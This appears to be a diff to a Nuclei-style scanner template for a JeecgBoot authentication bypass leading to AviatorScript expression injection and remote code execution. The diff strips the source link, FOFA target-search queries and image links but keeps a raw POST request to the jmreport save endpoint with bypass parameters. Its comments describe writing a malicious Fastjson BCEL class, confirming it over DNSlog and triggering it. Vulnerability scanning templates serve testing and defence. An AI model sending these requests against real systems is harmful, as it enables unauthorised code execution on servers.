@@ -3,12 +3,8 @@ info:
   name: JeecgBoot 权限绕过致AviatorScript表达式注入漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yab2w33l6ar9ug4w'
+  description: ''
   tags: unauth,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: yab2w33l6ar9ug4w
-    fofa: title=="JeecgBoot 企业级低代码平台" || body="window._CONFIG['imgDomainURL'] = 'http://localhost:8080/jeecg-boot/" || title="Jeecg-Boot 企业级快速开发平台" || title="Jeecg 快速开发平台" || body="'http://fileview.jeecg.com/on
 http:
 - raw:
   - 'POST /jeecg-boot/jmreport/save?previousPage=1&jmLink=YWFhfHxiYm&shareToken=1&token=1 HTTP/1.1
@@ -31,7 +27,6 @@ http:
 
     写入恶意报表数据(Fastjson BCEL)，Dnslog验证
 
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1728983573630-c5ead2be-8b61-4071-bc0b-d34455db7101.png)
 
     提取id数据触发漏洞，实现RCE'
   redirects: false
@@ -59,9 +54,7 @@ http:
     {"id":"123456"}
 
 
-    **PS：text处写入的恶意类会执行，回显null**
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1728983573950-9b767944-82d9-47ad-9fcc-ca9c68c9a28f.png)'
+    **PS：text处写入的恶意类会执行，回显null**'
   redirects: false
   matchers:
   - status:
